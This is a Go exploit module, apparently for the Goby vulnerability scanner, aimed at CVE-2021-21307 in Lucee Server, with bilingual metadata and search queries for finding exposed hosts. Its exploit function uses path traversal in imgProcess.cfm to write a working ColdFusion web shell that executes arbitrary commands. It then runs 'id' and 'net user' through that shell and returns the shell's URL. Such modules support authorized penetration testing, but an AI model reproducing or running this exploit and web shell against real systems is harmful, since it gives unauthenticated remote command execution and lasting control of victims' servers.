package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Lucee Server imgProcess.cfm IMGSRC RCE (CVE-2021-21307)",
    "Description": "Lucee Server is a dynamic, Java based (JSR-223), tag and scripting language used for rapid web application development. In Lucee Admin before versions 5.3.7.47, 5.3.6.68 or 5.3.5.96 there is an unauthenticated remote code exploit. This is fixed in versions 5.3.7.47, 5.3.6.68 or 5.3.5.96. As a workaround, one can block access to the Lucee Administrator.",
    "Impact": "Lucee Server imgProcess.cfm IMGSRC RCE (CVE-2021-21307)",
    "Recommendation": "Users can refer to the security bulletins provided by the following vendors to obtain patch information: https://github.com/lucee/Lucee/commit/",
    "Product": "Lucee Server",
    "VulType": [
        "Command Execution"
    ],
    "Tags": [
        "Command Execution"
    ],
    "Translation": {
        "CN": {
            "Name": "Lucee Server imgProcess.cfm 文件 IMGSRC 参数 远程命令执行漏洞（CVE-2021-21307）",
            "Description": "<p>Lucee Server 是一种动态的、基于 Java (JSR-223) 的标签和脚本语言，用于快速web应用程序开发。</p><p>在 5.3.7.47、5.3.6.68 或 5.3.5.96 版本之前的 Lucee 存在未经身份验证的远程命令执行漏洞，攻击者可以上传恶意cfm文件从而导致远程命令执行。</p>",
            "Impact": "<p>在 5.3.7.47、5.3.6.68 或 5.3.5.96 版本之前的 Lucee 中存在远程命令执行漏洞，攻击者可通过该漏洞，在服务器端任意执⾏代码，写⼊后⻔，获取服务器权限，进⽽控制整个web服务器。</p>",
            "Recommendation": "<p>厂商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://github.com/lucee/Lucee/security/advisories/GHSA-2xvv-723c-8p7r\" rel=\"nofollow\">https://github.com/lucee/Lucee/security/advisories/GHSA-2xvv-723c-8p7r</a></p>",
            "Product": "Lucee Server",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "Lucee Server imgProcess.cfm IMGSRC RCE (CVE-2021-21307)",
            "Description": "Lucee Server is a dynamic, Java based (JSR-223), tag and scripting language used for rapid web application development. In Lucee Admin before versions 5.3.7.47, 5.3.6.68 or 5.3.5.96 there is an unauthenticated remote code exploit. This is fixed in versions 5.3.7.47, 5.3.6.68 or 5.3.5.96. As a workaround, one can block access to the Lucee Administrator.",
            "Impact": "Lucee Server imgProcess.cfm IMGSRC RCE (CVE-2021-21307)",
            "Recommendation": "Users can refer to the security bulletins provided by the following vendors to obtain patch information: https://github.com/lucee/Lucee/commit/",
            "Product": "Lucee Server",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "FofaQuery": "body = \"lucee.runtime.Page\" ||  body =\"Rapid web development with Lucee!\" || body = \"lucee/formtag-form.cfm\"",
    "GobyQuery": "body = \"lucee.runtime.Page\" ||  body =\"Rapid web development with Lucee!\" || body = \"lucee/formtag-form.cfm\"",
    "Author": "gp827782797@qq.com",
    "Homepage": "https://github.com/lucee/",
    "DisclosureDate": "2021-02-11",
    "References": [
        "https://github.com/lucee/Lucee/security/advisories/GHSA-2xvv-723c-8p7r",
        "https://github.com/httpvoid/writeups/blob/main/Apple-RCE.md",
        "https://nvd.nist.gov/vuln/detail/CVE-2021-21307",
        "https://github.com/projectdiscovery/nuclei-templates/blob/master/cves/2021/CVE-2021-21307.yaml"
    ],
    "HasExp": false,
    "Is0day": false,
    "Level": "3",
    "CVSS": "9.8",
    "CVEIDs": [
        "CVE-2021-21307"
    ],
    "CNVD": [],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "filename",
            "type": "input",
            "value": "4acfg567",
            "show": ""
        }
    ],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "9687"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			cfg := httpclient.NewPostRequestConfig("/lucee/admin/imgProcess.cfm?file=/whatever")
			payload := "imgSrc=a"
			cfg.Data = payload
			cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfg.VerifyTls = false
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
				if resp.StatusCode == 200 {
					return true
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			fileName := "4acfg567"
			if ss.Params["filename"] != nil {
				fileName = ss.Params["filename"].(string)
			}
			fileName = fileName + ".cfm"
			cfg := httpclient.NewPostRequestConfig("/lucee/admin/imgProcess.cfm?file=/../../../context/" + fileName)
			cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfg.Data = `IMGSRC=<cfoutput>
        <table>
        <form method="POST" action="">
        <tr><td>Command:</td><td><input type=test name="cmd" size=50
        <cfif isdefined("form.cmd")>value="#form.cmd#"</cfif>><br></td></tr>
        <tr><td>Options:</td><td> <input type=text name="opts" size=50
        <cfif isdefined("form.opts")>value="#form.opts#"</cfif>><br></td></tr>
        <tr><td>Timeout:</td><td> <input type=text name="timeout" size=4
        <cfif isdefined("form.timeout")>value="#form.timeout#"
        <cfelse> value="5"</cfif>></td></tr>
        </table>
        <input type=submit value="Exec" >
        </form>
        <cfif isdefined("form.cmd")>
        <cfsavecontent variable="myVar">
        <cfexecute name = "#Form.cmd#"
        arguments = "#Form.opts#"
        timeout = "#Form.timeout#">
        </cfexecute>
        </cfsavecontent>
        <pre>
        #HTMLCodeFormat(myVar)#
        </pre>
        </cfif>
        </cfoutput>
`
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			if _, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
			}
			cfg2 := httpclient.NewPostRequestConfig("/lucee/" + fileName)
			cfg2.Data = "cmd=id&opts=&timeout=5"
			cfg2.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfg2.VerifyTls = false
			if resp2, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg2); err == nil {
				if strings.Contains(resp2.Utf8Html, "uid=") || strings.Contains(resp2.Utf8Html, "gid=") {
					expResult.Success = true
					expResult.Output = "Webshell: " + expResult.HostInfo.FixedHostInfo + "/lucee/" + fileName + "\n"
					return expResult
				}
			}
			cfg3 := httpclient.NewPostRequestConfig("/lucee/" + fileName)
			cfg3.Data = "cmd=net user&opts=&timeout=5"
			cfg3.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfg3.VerifyTls = false
			if resp3, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg3); err == nil {
				if strings.Contains(resp3.Utf8Html, "Administrator") {
					expResult.Success = true
					expResult.Output = "Webshell: " + expResult.HostInfo.FixedHostInfo + "/lucee/" + fileName + "\n"
					return expResult
				}
			}
			return expResult
		},
	))
}
